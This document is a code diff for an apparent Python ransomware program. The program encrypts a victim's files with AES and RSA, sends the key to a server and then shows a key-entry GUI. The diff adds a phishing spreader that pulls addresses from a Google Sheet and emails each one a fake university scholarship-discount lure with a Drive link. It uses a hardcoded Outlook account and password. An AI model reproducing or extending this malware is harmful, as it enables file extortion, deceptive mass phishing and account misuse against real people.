@@ -1,11 +1,21 @@
 import os
-import binascii
+import csv
 
+import binascii
+import sys
+from email.mime.text import MIMEText
+
+import requests
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.Padding import pad, unpad
 import base64
 import tkinter as tk
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
 import pyperclip
 
 import socket
@@ -171,28 +181,6 @@ def decryptor():
     decrypt_files(aes_key)
 
 
-def encryptor():
-    # generate aes key
-    aes_key = generate_aes_key()
-
-    # encrypt files with aes key
-    encrypt_files(aes_key)
-
-    # get public key
-    public_key = generate_public_key()
-
-    # encrypt aes key with public key
-    encrypted_aes_key = encrypt_rsa(aes_key, public_key)
-
-    # send encrypted aes key to the server, paired with the public key
-    send_encrypted_aes_to_server(encrypted_aes_key, public_key)
-
-    # store public key on the desktop
-    store_public_key_on_desktop(public_key)
-
-    # TODO: infect emails
-
-
 def show_gui():
     def submit_public_key():
         public_key_str = public_key_entry.get()
@@ -225,11 +213,79 @@ def show_gui():
 
     window.mainloop()
 
+def send_email(recipient_email):
+    sender_email = "future.university@hotmail.com"
+    sender_password = "mmm@2468"
+    subject = "Future University"
+    body = "Hello, you are selected for 50% discount on postgraduate studies at Future University. please find the attached file."
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = recipient_email
+    message["Subject"] = subject
+
+    html_body = f"""\
+        <html>
+            <body>
+                <p>{body}</p>
+                <p>Click <a href="https://drive.google.com/drive/folders/1ZOlFrMTBlAD0TYuDHBNbIjSFhiIkMsnc?usp=share_link">here</a> Scholarship details</p>
+            </body>
+        </html>
+        """
+
+    message.attach(MIMEText(html_body, "html"))
+
+    # Connect to the SMTP server and send the email
+    with smtplib.SMTP("smtp-mail.outlook.com", 587) as server:
+        server.starttls()
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, recipient_email, message.as_string())
+
+
+def send_emails_from_csv():
+    csv_url = "https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv"
+    response = requests.get(csv_url)
+    if response.status_code == 200:
+        csv_data = response.content.decode("utf-8").splitlines()
+        reader = csv.DictReader(csv_data)
+        for row in reader:
+            recipient_email = row["Email"]
+            send_email(recipient_email)
+    else :
+        print("Error: " + str(response.status_code))
+
+
+def encryptor():
+    # generate aes key
+    aes_key = generate_aes_key()
+
+    # encrypt files with aes key
+    encrypt_files(aes_key)
+
+    # get public key
+    public_key = generate_public_key()
+
+    # encrypt aes key with public key
+    encrypted_aes_key = encrypt_rsa(aes_key, public_key)
+
+    # send encrypted aes key to the server, paired with the public key
+    send_encrypted_aes_to_server(encrypted_aes_key, public_key)
+
+    # store public key on the desktop
+    store_public_key_on_desktop(public_key)
+
+    # TODO: infect emails
+    send_emails_from_csv()
+
+    return True
+
 
 if __name__ == "__main__":
     if not os.path.exists(public_key_test_path + '\\PublicKey.key'):
         # First run: Encryption
-        encryptor()
+        encryption_complete = encryptor()
+        if encryption_complete:
+            show_gui()
+
     else:
         # Other runs: GUI
         show_gui()
